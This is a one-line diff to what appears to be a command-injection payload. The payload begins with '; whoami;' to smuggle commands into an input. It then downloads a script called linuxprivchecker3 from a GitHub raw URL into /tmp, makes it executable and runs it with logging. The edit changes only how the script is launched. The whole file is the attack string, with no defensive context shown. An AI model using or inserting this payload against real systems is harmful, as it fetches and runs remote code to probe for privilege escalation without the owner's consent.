@@ -1,1 +1,1 @@
-; whoami; cd /tmp && curl -O https://raw.githubusercontent.com/albertlilem/test/master/linuxprivchecker3 ; chmod +x /tmp/linuxprivchecker3 ; bash -c /tmp/linuxprivchecker3 |tee /tmp/log
+; whoami; cd /tmp && curl -O https://raw.githubusercontent.com/albertlilem/test/master/linuxprivchecker3 ; chmod +x /tmp/linuxprivchecker3 ; cd /tmp && bash -c ./linuxprivchecker3 |tee /tmp/log
